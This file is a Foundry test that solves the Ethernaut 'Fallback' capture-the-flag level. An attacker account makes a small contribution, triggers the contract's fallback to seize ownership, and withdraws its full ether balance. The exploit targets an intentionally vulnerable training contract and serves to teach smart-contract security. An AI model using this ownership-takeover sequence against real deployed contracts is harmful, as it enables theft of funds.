// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/Ethernaut.sol";
import { Fallback } from "../src/Fallback/Fallback.sol";
import { FallbackFactory } from "../src/Fallback/FallbackFactory.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    Fallback ethernautFallback;

    address lvlAddress;
    address h3x0r = vm.addr(1337);
    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(h3x0r, 10 wei);
    }

    function fallbackSetUp() internal {
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(h3x0r);
        lvlAddress = ethernaut.createLevelInstance(fallbackFactory);
        ethernautFallback = Fallback(payable(lvlAddress));
        deal(address(ethernautFallback), 1 ether);
    }

    function testFallbackHack() public {
        fallbackSetUp();

        assertEq(address(ethernautFallback).balance, 1 ether);

        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.getContribution(), 1 wei, "verify contribution");

        (bool success, )  = address(ethernautFallback).call{value: 2 wei}("hi");
        assertTrue(success, "verify if call successfull");

        ethernautFallback.withdraw();

        assertEq(address(ethernautFallback).balance, 0);
        assertEq(h3x0r.balance, 1 ether + 10 wei);

        bool levelPassed = ethernaut.submitLevelInstance(
            payable(lvlAddress)
        );
        assert(levelPassed);
    }
}